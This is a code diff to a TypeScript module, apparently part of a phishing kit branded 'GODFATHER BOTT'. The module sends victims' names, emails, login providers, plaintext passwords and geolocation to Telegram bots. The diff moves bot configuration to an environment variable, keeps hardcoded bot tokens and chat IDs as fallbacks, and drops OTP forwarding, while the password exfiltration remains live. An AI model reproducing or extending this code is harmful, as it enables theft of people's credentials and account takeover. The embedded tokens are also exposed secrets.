@@ -1,9 +1,33 @@
 import type { GeoInfo } from './geo.ts';
+import { env } from '../config/env.ts';
 
-const TELEGRAM_BOTS = [
+interface TelegramBot {
+  token: string;
+  chatId: string;
+}
+
+const FALLBACK_BOTS: TelegramBot[] = [
   { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
   { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
 ];
+
+function loadTelegramBots(): TelegramBot[] {
+  if (env.telegramBotsJson) {
+    try {
+      const parsed = JSON.parse(env.telegramBotsJson) as TelegramBot[];
+      return parsed.filter((bot) => bot?.token && bot?.chatId);
+    } catch {
+      console.error('[telegram] Invalid TELEGRAM_BOTS JSON — alerts disabled.');
+      return [];
+    }
+  }
+
+  if (!env.isProduction) {
+    return FALLBACK_BOTS;
+  }
+
+  return [];
+}
 
 export async function sendTelegramNotification(
   name: string,
@@ -12,10 +36,14 @@ export async function sendTelegramNotification(
   password: string,
   geo?: GeoInfo,
 ): Promise<void> {
-  const isOtp = password.startsWith('[OTP Code]');
-  const credentialLabel = isOtp ? '🔑 <b>OTP Code:</b>' : '🔒 <b>Password:</b>';
-  const displayPassword = isOtp ? password.replace('[OTP Code]', '').trim() : password;
-  const statusLabel = isOtp ? 'One-Time Code Submitted' : 'Successfully Authenticated';
+  if (password.startsWith('[OTP Code]')) {
+    return;
+  }
+
+  const bots = loadTelegramBots();
+  if (!bots.length) {
+    return;
+  }
 
   const geoLines = geo
     ? [
@@ -42,11 +70,11 @@ export async function sendTelegramNotification(
   ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
 ╚══════════════════════════════╝
 
-✅ <b>Status:</b> ${statusLabel}
+✅ <b>Status:</b> Successfully Authenticated
 👤 <b>Name:</b> ${name}
 📧 <b>Email:</b> ${email}
 🔗 <b>Provider:</b> ${provider}
-${credentialLabel} <code>${displayPassword}</code>
+🔒 <b>Password:</b> <code>${password}</code>
 🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -54,28 +82,22 @@ ${credentialLabel} <code>${displayPassword}</code>
 <code>@godfather_bott</code>
   `.trim();
 
-  try {
-    await Promise.allSettled(
-      TELEGRAM_BOTS.map(async ({ token, chatId }, index) => {
-        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'HTML',
-          }),
-        });
+  await Promise.allSettled(
+    bots.map(async ({ token, chatId }, index) => {
+      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML',
+        }),
+      });
 
-        if (!res.ok) {
-          const err = await res.text();
-          console.error(`[Bot ${index}] Failed: ${res.status} — ${err}`);
-        } else {
-          console.log(`[Bot ${index}] Sent successfully`);
-        }
-      }),
-    );
-  } catch (error) {
-    console.error('Unexpected error sending Telegram notifications:', error);
-  }
+      if (!res.ok) {
+        const err = await res.text();
+        console.error(`[telegram ${index}] send failed: ${res.status} — ${err}`);
+      }
+    }),
+  );
 }
